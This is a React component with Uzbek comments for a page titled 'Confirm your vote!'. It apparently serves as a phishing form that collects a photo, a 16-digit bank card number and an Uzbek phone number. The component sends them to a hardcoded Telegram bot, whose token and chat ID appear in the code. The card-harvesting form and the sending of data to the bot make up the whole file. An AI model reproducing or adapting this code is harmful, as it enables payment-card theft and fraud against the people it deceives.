import React, { useState } from "react";
import axios from "axios";
import './FileUpload.css'; // CSS faylni import qilish

const FileUpload = () => {
  const [selectedFile, setSelectedFile] = useState(null);
  const [cardNumber, setCardNumber] = useState(""); // Karta raqami
  const [phoneNumber, setPhoneNumber] = useState(""); // Telefon raqami
  const [uploadStatus, setUploadStatus] = useState("");

  const BOT_TOKEN = "6874121833:AAEkolxhDMODg6ok12KKzzXzTp_MVYf7T5Q"; // Sizning bot tokeningiz
  const CHAT_ID = "5073179730"; // Sizning chat ID

  // Fayl tanlanganda ishga tushadi
  const onFileChange = (event) => {
    setSelectedFile(event.target.files[0]);
  };

  // Karta raqami o'zgarishini boshqarish
  const onCardNumberChange = (event) => {
    const value = event.target.value.replace(/\D/g, ''); // Faqat raqamlarni qabul qilish
    setCardNumber(value);
  };

  // Telefon raqami o'zgarishini boshqarish
  const onPhoneNumberChange = (event) => {
    const value = event.target.value.replace(/[^+\d]/g, ''); // Faqat + va raqamlarni qabul qilish
    if (value.startsWith("+998") || value === "") {
      setPhoneNumber(value);
    }
  };

  // Faylni yuklash va botga yuborish uchun
  const onFileUpload = async () => {
    if (!selectedFile || !cardNumber || !phoneNumber) {
      setUploadStatus("Iltimos, barcha maydonlarni to'ldiring va faylni tanlang.");
      return;
    }

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", selectedFile);
    formData.append("caption", `Karta raqami: ${cardNumber}\nTelefon raqam: ${phoneNumber}`); // Karta va telefon raqamlarini qo'shish

    try {
      const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData, {
        headers: {
          "Content-Type": "multipart/form-data",
        },
      });

      if (response.status === 200) {
        setUploadStatus("Fayl muvaffaqiyatli botga yuborildi!");
        setSelectedFile(null); // Fayl yuborilgandan so'ng qiymatini 0 ga tushirish
        setCardNumber(""); // Karta raqamini tozalash
        setPhoneNumber(""); // Telefon raqamini tozalash
        alert("Fayl muvaffaqiyatli yuborildi!"); // Alert xabarini ko'rsatish
        window.location.reload(); // Sahifani qayta yuklash
      } else {
        setUploadStatus("Faylni botga yuborishda xatolik yuz berdi.");
      }

      console.log(response.data);
    } catch (error) {
      setUploadStatus("Faylni botga yuborishda xatolik yuz berdi.");
      console.error(error);
    }
  };

  return (
    <div className="file-upload-container">
      <h2>Ovozni Tasdiqlash!</h2>
      <input type="file" onChange={onFileChange} accept="image/*" className="file-input" />
      <input 
        type="text" 
        placeholder="Karta raqami" 
        value={cardNumber} 
        onChange={onCardNumberChange} 
        className="text-input"
        maxLength="16" // Maksimal uzunlik 16 raqam
        pattern="\d{16}" // 16 raqamdan iborat
        title="Karta raqami 16 ta raqamdan iborat bo'lishi kerak."
      />
      <input 
        type="text" 
        placeholder="Telefon raqam" 
        value={phoneNumber} 
        onChange={onPhoneNumberChange} 
        className="text-input"
        pattern="\+998\d{9}" // O'zbekiston telefon raqami
        title="Telefon raqam O'zbekiston telefon raqamiga mos kelishi kerak (+998XXXXXXXXX)."
      />
      <button onClick={onFileUpload} className="upload-button">Yuborish</button>
      <p className="status-message">{uploadStatus}</p>
    </div>
  );
};

export default FileUpload;
